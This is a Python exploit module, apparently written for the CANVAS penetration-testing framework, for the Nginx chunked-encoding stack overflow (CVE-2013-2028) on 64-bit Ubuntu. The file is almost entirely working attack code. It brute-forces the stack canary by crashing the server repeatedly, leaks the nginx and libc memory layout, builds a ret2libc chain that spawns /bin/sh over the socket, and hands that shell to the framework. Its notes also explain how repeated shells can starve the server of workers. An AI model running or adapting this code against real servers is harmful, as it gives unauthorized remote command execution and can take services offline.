#!/usr/bin/env python

import sys
if '.' not in sys.path: sys.path.append('.')

import struct
import socket
import random
import string
import canvasengine
import unixShellNode

from tcpexploit import tcpexploit
from libs.ctelnetlib import Telnet
from MOSDEF.mosdefutils import hexprint, prettyprint
from shelllistener import shelllistener, shellfromtelnet
from exploitutils import standard_callback_commandline


NAME                           = 'Nginx Chunked Encoding Exploit'
DESCRIPTION                    = 'Nginx Chunked Encoding Stack Buffer Overflow'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Nginx'
DOCUMENTATION['CVE Name']      = 'cve-2013-2028'
DOCUMENTATION['CVE Url']       = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2028'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Remote'
PROPERTY['ARCH']               = [['Linux']]
PROPERTY['VERSION']            = ['x64']
DOCUMENTATION['Repeatability'] = """
The repeatability of this exploit depends on the number of nginx worker processes (configured in conf/nginx.conf; the default is 4).
The exploit will take over one of the processes to spawn a shell.  This means the worker process is unavailable to process requests while the shell is running.
The master process will not spawn a replacement worker until the shell exits.  So, if you create a number of shells equal to the number of worker processes, the server will not respond to any requests until at least one process exits.
"""
DOCUMENTATION['Notes']         = """
*** This exploit will take several (up to 20) minutes to run. ***
The stack cookie/canary is dynamically determined, as well as function addresses.

This exploit will give you a Canvas UnixShellNode running under the nginx worker process account (typically nobody).
To get a full-featured Canvas Linux node, you should check to see if the target supports running 32-bit binaries.
The way to do it on some distros (including RedHat Linux) is:
\tservice ia32el status (Piped Command)
If the return value is 0, then the IA-32 Execution Layer is installed and running. You can build a 32-bit Linux MOSDEF trojan, upload and execute it.

"""
DOCUMENTATION['DevNotes']         = """
Linux appears to be the only vulnerable platform. recv() BSD and Windows will return an error.
* BSD will generate a log entry like the following:
2013/05/13 09:46:35 [alert] 4124#0: *1 recv() failed (22: Invalid argument), client: 10.10.201.243, server: , request: "POST /none.hp HTTP/1.1", host: "10.10.201.201"
* MSDN: http://msdn.microsoft.com/en-us/library/windows/desktop/ms740121(v=vs.85).aspx

Tested on:
Nginx 1.3.12 on Ubuntu 12.04 LTS (Precise)
Nginx 1.4.0  on Ubuntu 12.04 LTS (Precise)

This exploit will only work against Ubuntu 64bit targets.
This exploit depends on TCP packet fragmentation and will not work reliably
when executed on non-Linux CANVAS hosts.

"""

CHANGELOG = """
"""
targets = {
    0: ['Autodetect',[0,0,0,0]],
    1: ['Nginx-1.4.0', [0,0,0,0]],
    2: ['Nginx-1.3.16', [0,0,0,0]],
    3: ['Nginx-1.3.15', [0,0,0,0]],
    4: ['Nginx-1.3.14', [0,0,0,0]],
    5: ['Nginx-1.3.13', [0,0,0,0]],
    6: ['Nginx-1.3.12', [0,0,0,0]],
    7: ['Nginx-1.3.11', [0,0,0,0]],
    8: ['Nginx-1.3.10', [0,0,0,0]],
    9: ['Nginx-1.3.9', [0,0,0,0]]
}

vulnVersions = {
    "nginx/1.3.9":9, 
    "nginx/1.3.10":8,
    "nginx/1.3.11":7,
    "nginx/1.3.12":6,
    "nginx/1.3.13":5,
    "nginx/1.3.14":4,
    "nginx/1.3.15":3,
    "nginx/1.3.16":2,
    "nginx/1.4.0":1
    }

DT_STRTAB   = 5
DT_SYMTAB   = 6
DT_GNU_HASH = 0x6ffffef5
SHUT_RDWR   = socket.SHUT_RDWR
MAX_TRIES   = 10 # Number of times to call accept on remote listener

    
class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name             = NAME
        self.badstring        = ';\r\n'
        self.targetname       = ''
        self.host             = ''
        self.port             = 80
        self.version          = 0
        self.versions         = targets
        self.canary           = ''
        self.ngx_unix_send    = ''
        self.writable         = ''
        self.libcmap          = 0
        self.libcaddr         = 0
        self.crashes          = 0
        self.start_address    = 0
        self.end_address      = 0
        self.alt_stack_layout = False
    
    def getargs(self):
        self.port     = int(self.argsDict.get("port", self.port))
        self.getarg('targetname')
        self.getarg('alt_stack_layout')

        self.start_address = int(self.argsDict.get('start_address', "0x41c000"), 0)
        self.end_address   = int(self.argsDict.get('end_address', "0x430000"), 0)

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]
    
    def test(self):
        self.getargs()
        self.host = self.target.interface
        
        if not self.targetname: self.targetname = self.host
            
        buf = 'POST /%s HTTP/1.1\r\n' % self.randomString(8)
        buf+= 'Host: %s\r\n' % self.targetname
        buf+= 'Connection: close\r\n'
        buf+= 'Transfer-Encoding: chunked\r\n'
        buf+= '\r\n'
        buf+= '0\n\n'
          
        ret = self.bannerchecktest(vulnVersions, sendstr=buf)
        self.log('Test done. Version is %d, ret=%d' % (self.version, ret))
        return ret

    def check_crashed(self):
        # We have to override this here as canvasexploit.check_crashed will
        # go ahead and run test() again.
        return False
    
    def createBuffer(self, sc=''):
        scLen = len(sc)
        if scLen > 4096:
            self.log('Shellcode is too long! Must be < 0x1000 bytes.')
            return ''
        
        buf = 'POST /%s HTTP/1.1\r\n' % self.randomString(8)
        buf+= 'Host: %s\r\n' % self.targetname
        buf+= 'Connection: Keep-Alive\r\n'
        buf+= 'Transfer-Encoding: chunked\r\n'
        buf+= '\r\n'  
        buf+= 'c\nQn0;QRSSSTTT\nffffffffffffffe3;SSS'
        baseLen = len(buf)
        buf+= self.randomString(1024-baseLen)
        buf+= sc
        buf+= self.randomString(4096-scLen)
        buf+= 'AAAAAAAA'
        
        return buf
    
    def randomString(self, n):
        return ''.join([chr(random.randint(0x41, 0x5a)) for _ in range(n)])
    
    def sendExploitGuessCanary(self, buf):
        canary = '\x00' #first byte is always 0
        byte = 0
              
        while (len(canary) < 8):
            b = buf + canary + chr(byte)
            self.log('Checking for canary %s (%x)'%(hexprint(canary), byte))

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.host, self.port))
            except Exception:
                raise Exception('Could not connect to %s:%d' % (self.host, self.port))

            try:
                s.send(b)
                self.crashes += 1
                data = s.recv(1024)
                s.close()
                #if we succeeded, add the current byte to the canary
                if data == '':
                    raise Exception('no data')
                
                self.log('Found canary byte (%x)'%byte)

                if string.count(self.badstring, chr(byte)) != 0:
                    self.log('Canary value contains a bad byte!')
                    self.log('Exploit will not succeed!')
                    raise Exception('bad byte in canary')

                canary += chr(byte)
                byte = 0
            except Exception:
                s.close()
                #we killed the server, try the next byte value
                byte += 1
                
                if byte > 0xff:
                    self.log('[-] Failed to find canary value!')
                    raise Exception('Failed to find canary value')

            if self.getState() == self.HALT:
                raise Exception('User aborted')
            
        #At this point we have found the canary value
        if canary == '\x00\x00\x00\x00\x00\x00\x00\x00':
            #We didn't find a canary--this target is just not vulnerable
            self.crashes = 0
            raise Exception('No canary found; target is not vulnerable')
        
        self.canary = canary
        return canary
    
    def sendExploitFindSend(self, buf):
        foundSend = False
        unix_send = self.start_address
            
        while (not foundSend):
            b = buf + self.canary + self.randomString(24) + struct.pack('<Q',unix_send)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.log('Checking for ngx_unix_send at address %x' % unix_send)
            
            try:
                s.connect((self.host, self.port))
            except Exception:
                raise Exception('Could not connect to %s:%d' % (self.host, self.port))

            try:
                s.send(b)
                self.crashes+=1
                data = s.recv(1024)
                s.close()
                #if we succeeded, we will have received some heap data
                if data == '' or data[:4] == 'HTTP':
                    raise Exception('no data %s'%data[:0x20])
                self.log('Found ngx_unix_send (%x)'%unix_send)
                foundSend = True
            except Exception:
                s.close()
                
                #we killed the process, try the next value
                unix_send += 1
                
                if unix_send > self.end_address:
                    self.log('[-] Failed to find ngx_unix_send fxn')
                    raise Exception('Failed to find ngx_unix_send')

            if self.getState() == self.HALT:
                raise Exception('User abort')
                    
        #found it
        self.ngx_unix_send = struct.pack('<Q', unix_send+2)
        return data
    
    def findWritableAddress(self, data):
        w = data[:8]
        x = struct.unpack('<Q', w)[0]
        if x == 0:
            w = struct.pack('<Q', 0x6ea000)
        self.writable = w
        self.log('Found writable address %x'%(struct.unpack('<Q', self.writable)[0]))
        return self.writable
             
    def sendExploitReadNginx(self, buf):
        rbx = struct.pack('<Q', 0x6da3b0)
        readLen = struct.pack('<Q', 0x2000)
        readAddr = 0x400000
        data = '0'
        gooddata = ''
        f = open('nginx_binary', 'wb')
        
        try:
            b = buf + self.canary + rbx + self.writable*2 + self.ngx_unix_send
            
            if self.alt_stack_layout: b += self.randomString(16)
                
            b+= rbx + self.writable*2 + readLen + struct.pack('<Q',readAddr)
            b+= self.ngx_unix_send
                    
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #s.set_timeout(120)
            self.log('Trying to read nginx binary')
            #print 'sleeping'
            #time.sleep(30)
            s.connect((self.host, self.port))
            s.send(b)
            self.crashes+=1
            
            got = 0
            self.log('Ready to receive nginx buffer from %x'%readAddr)
            while (data):
                data = s.recv(0x6000)
                got += len(data)
                gooddata += data
                self.log('\tgot %x bytes'%got)
                    
            if got == 0:
                #Our +2 heuristic was no good. Try again.
                f.close()
                nus = struct.unpack('<Q', self.ngx_unix_send)[0]
                self.ngx_unix_send = struct.pack('<Q', nus-2)
                return self.sendExploitReadNginx(buf)                
            
            gooddata = gooddata[got-0x2000:]
            f.write(gooddata)
            
        except Exception, exp:
            self.log('%s' % exp)
                
        self.log('Finished reading %x bytes'%(readAddr-0x400000))
        f.close()
        self.parseNginx64()
                       
    def parseNginx64(self):        
        f = open('nginx_binary', 'rb')
        ngx = f.read()
        f.close()      
        (id1, id2, etype, emachine, eversion, eentry, ephoff) = \
            struct.unpack('<QQHHLQQ', ngx[:0x28])

        #print '%x %x %x %x %x %x %x'%(id1,id2,etype,emachine,eversion,eentry,ephoff)
        phoff = struct.unpack('<Q', ngx[0x20:0x28])[0]
        
        #Find the PT_DYNAMIC section
        libcmapaddr = 0
        phdr = ngx[phoff:]
        PT_DYNAMIC = 2
        ptype = struct.unpack('<L',phdr[:4])[0]
        while (ptype != PT_DYNAMIC):
            phdr = phdr[0x38:]
            ptype = struct.unpack('<L',phdr[:4])[0]
            
        vaddr = struct.unpack('<Q',phdr[0x10:0x18])[0]
        
        self.log('Reading dynamic section (starts at %x)'%vaddr)
        dyn = self.readMemChunk(vaddr)
        DT_PLTGOT = 3
        dtag = struct.unpack('<Q', dyn[:8])[0]
        while (dtag != DT_PLTGOT):
            dyn = dyn[0x10:]
            dtag = struct.unpack('<Q',dyn[:8])[0]
            
        pltgotaddr = struct.unpack('<Q',dyn[8:0x10])[0]
        self.log ('reading .plt.got at address %x'%pltgotaddr)
        pltgot = self.readMemChunk(pltgotaddr)
        
        linkmapaddr = struct.unpack('<Q', pltgot[8:0x10])[0]
        self.log ('reading link map at address %x'%linkmapaddr)
        linkmap = self.readMemChunk(linkmapaddr, chunklen=0x100)
        
        foundLibc = False
        nextaddr = 0
        while (not foundLibc):
            libcmapaddr = nextaddr
            nameaddr = struct.unpack('<Q', linkmap[8:0x10])[0]
            nextaddr = struct.unpack('<Q', linkmap[0x18:0x20])[0]
            name = self.readMemChunk(nameaddr, 0x100)
            if self.isLibc(name):
                foundLibc = True
            else:
                self.log('reading link_map entry at %x'%nextaddr)
                linkmap = self.readMemChunk(nextaddr, 0x100)
                
        #At this point we've found libc
        libcaddr = struct.unpack('<Q', linkmap[:8])[0]
        self.log( 'libc.so is mapped at address %x'%libcaddr )
        self.libcmap = libcmapaddr
        self.libcaddr = libcaddr
        
    def isLibc(self, nameBuffer):
        name = string.split(nameBuffer, '\x00')[0]
        self.log( 'checking library %s'%name )
        return string.count(name, 'libc.so')
    
    def readMemChunk(self, addr, chunklen=0x2000):
        if addr == 0:
            raise Exception("Can't read address 0")
        
        rbx = struct.pack('<Q', 0x6da3b0)
        readAddr = addr
        readLen = struct.pack('<Q', chunklen)
        gooddata = ''
        data = '0'
        buf = self.createBuffer()
        try:
            b = buf + self.canary + rbx + self.writable*2 + self.ngx_unix_send
            if self.alt_stack_layout: b += self.randomString(0x10)
            b+= rbx + self.writable*2 + readLen + struct.pack('<Q',readAddr)
            b+= self.ngx_unix_send
                                
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #s.set_timeout(120)
            self.log('Trying to read chunk at %x'%readAddr)
            s.connect((self.host, self.port))
            s.send(b)
            self.crashes+=1
            
            got = 0
            while (data):
                data = s.recv(0x6000)
                got += len(data)
                gooddata += data
                #self.log('\tgot %x bytes'%got)
                            
            gooddata = gooddata[got-chunklen:]
            
        except Exception, exp:
            self.log('%s' % exp)
            
        return gooddata       
        
    
    def sendExploitFindBytes(self, byteseq):
        chunknum = 0
        self.log('Reading libc header')
        libcHdr = self.readMemChunk(self.libcaddr)
        entryoff = struct.unpack('<Q', libcHdr[0x18:0x20])[0]
        found = 0
        
        self.log('findbytes %s: reading in .text'%prettyprint(byteseq))
        while (not found):
            chunk = self.readMemChunk(self.libcaddr+chunknum*0x2000)
            found = string.count(chunk, byteseq)
        
            if (found):
                x = string.find(chunk, byteseq)
                self.log('found the sequence! %x'%(self.libcaddr+x+chunknum*0x2000))
                return self.libcaddr + x + chunknum *0x2000
            
            chunknum += 1
            
    
    def elfGetDynamicEntry(self, tag):
        self.log('Entering elfGetDynamicEntry')
        linkmap = self.readMemChunk(self.libcmap, 0x400)
        dynaddr = struct.unpack('<Q', linkmap[0x10:0x18])[0]
        dyn = self.readMemChunk(dynaddr)
        dtag = struct.unpack('<Q', dyn[:8])[0]
        while dtag != tag:
            dyn = dyn[0x10:]
            (dtag,dptr) = struct.unpack('<QQ', dyn[:0x10])
            #print 'checking tag %x'%dtag
            
        self.log( 'found tag %d at address %x'%(tag, dptr) )
        return dptr
    
    def elfGetSymtab(self):
        return self.elfGetDynamicEntry(DT_SYMTAB)
    
    def elfGetStrtab(self):
        return self.elfGetDynamicEntry(DT_STRTAB)
    
    def elfGetGnuHash(self):
        return self.elfGetDynamicEntry(DT_GNU_HASH)
    
    def elfGnuHash(self, symbol):
        h = 5381
        for c in symbol:
            h = h*33 + ord(c)
        return h & 0xffffffff
    
    def sendExploitFindFunction(self, fxnname):
        fxn = 0
        symtabaddr = self.elfGetSymtab()
        strtabaddr = self.elfGetStrtab()
        gnuhashaddr = self.elfGetGnuHash()
        
        self.log( 'reading strtab' )
        i = 0
        strtab = ''
        while (i < 0x10000):
            strtab+= self.readMemChunk(strtabaddr+i)
            i += 0x2000
            
        self.log( 'reading gnu hash' )
        gnuhash = self.readMemChunk(gnuhashaddr)
        gnuhash += self.readMemChunk(gnuhashaddr+0x2000)
        
        (nbuckets,symndx,maskwords,shift2) = struct.unpack('<4L', gnuhash[:0x10])
        #print 'nbuckets=%x, maskwords=%x'%(nbuckets,maskwords)
        bloom = gnuhash[0x10:]
        buckets = bloom[maskwords*8:]
        hashvals = buckets[nbuckets*4:]
        
        h1 = self.elfGnuHash(fxnname)
        #print '%s hashes to %x'%(fxnname, h1)
        h2 = h1 >> shift2
        c = 8 * 8
        
        #TODO:error checking 
        #n = (h1/c) % maskwords
        #bitmask = (1 << (h1%c)) | (1 << (h2%c))        
        
        n_ = buckets[(h1%nbuckets)*4:]
        n = struct.unpack('<L',n_[:4])[0]
        #print 'n = %x'%n
        
        symaddr = symtabaddr + n*0x18
        self.log( 'reading symtab' )
        sym = self.readMemChunk(symaddr)
        (stname,c1,c2,shn,val,sz) = struct.unpack('<LBBHQQ', sym[:0x18])
        #print 'sanity check: stname=%x, val=%x'%(stname,val)
        
        #print 'symndx = %x'%symndx
        hashval = hashvals[(n - symndx)*4:]
        
        self.log( 'going to search for symbol "%s" in hash chain'%fxnname )
        h1 &= 0xfffffffe
        while (1):
            h2 = struct.unpack('<L',hashval[:4])[0]
            hashval = hashval[4:]
            stname = struct.unpack('<L',sym[:4])[0]
            #print 'h2, stname = %x, %x'%(h2,stname)
            cursymbol = string.split(strtab[stname:], '\x00')[0]
            #print 'cursymbol = %s'%cursymbol
            if (h1 == (h2 & 0xfffffffe)) and cursymbol == fxnname:
                stvalue = struct.unpack('<Q',sym[8:0x10])[0]
                fxn = self.libcaddr + stvalue
                self.log('found fxn %s at address %x'%(fxnname,fxn))
                return fxn
            if (h2 & 1):
                break
            sym = sym[0x18:]
        
        self.log('[-] Failed to find symbol')
        return 0
    
    def makeRet2LibcStack(self):
        poprsi = self.sendExploitFindBytes('\x5e\xc3')
        poprdi = self.sendExploitFindBytes('\x5f\xc3')
        binsh = self.sendExploitFindBytes('/bin/sh\x00')
        dup2 = self.sendExploitFindFunction('dup2')
        execl = self.sendExploitFindFunction('execl')
        
        stack = struct.pack('<9Q', poprsi, 1, dup2, poprsi, 0, dup2, poprdi, binsh, execl)
        for c in self.badstring:
            if string.count(stack, c) > 0:
                self.log('some libc addresses contain bad bytes!')
                self.log( '%x, %x, %x, %x, %x'%(poprdi,poprsi,binsh,dup2,execl) )
                
        return stack
    
    def sendFullExploit(self):
        shell = None
        buf = self.createBuffer()
        shellstack = self.makeRet2LibcStack()
        #print 'Sleeping...'
        #time.sleep(30) #gives you time to attach a debugger        
        
        try:
            b = buf + self.canary + self.randomString(0x18) + shellstack
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #s.set_timeout(600) # used for debugging
            self.log('so close!')
            s.connect((self.host, self.port))
            s.send(b)
                                
            # make this shell into a Canvas node
            self.log('Converting to Canvas node')
            shell = self.convertToCanvas(s)
                                
        except Exception, exp:
            s.close()
            self.crashes += 1
            self.log('%s' % exp)
                
        return shell
    
    def convertToCanvas(self, sock): 
        self.log('Starting UnixShellNode')
        tn = Telnet()
        tn.sock = sock
        
        node = unixShellNode.unixShellNode()
        node.parentnode = self.argsDict['passednodes'][0]
        node.shell = shelllistener(shellfromtelnet(tn), simpleShell=1)   
        return node
    
    def run(self):
        self.getargs()
        self.host = self.target.interface
        
        if not self.targetname: self.targetname = self.host

        try:
            buf = self.createBuffer()
            self.nextProgress()
            self.sendExploitGuessCanary(buf)
            self.nextProgress()
            data = self.sendExploitFindSend(buf)
            self.nextProgress()
            self.findWritableAddress(data)
            self.nextProgress()
            self.sendExploitReadNginx(buf)
            
            self.log('[+] Ready to send full exploit!')
            shell = self.sendFullExploit()
            
            self.log('[+] Full exploit sent.')
            self.log('We crashed the service %d times' % self.crashes)
            return shell
        
        except Exception, exp:
            self.log('%s' % exp)
            self.log('We crashed the service %d times' % self.crashes)
            return 0
        except struct.error:
            self.log('Exploit failure, try setting alternate stack layout')
            return 0
        
    
    if __name__ == '__main__':
        print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
        app = theexploit()
        ret = standard_callback_commandline(app)         


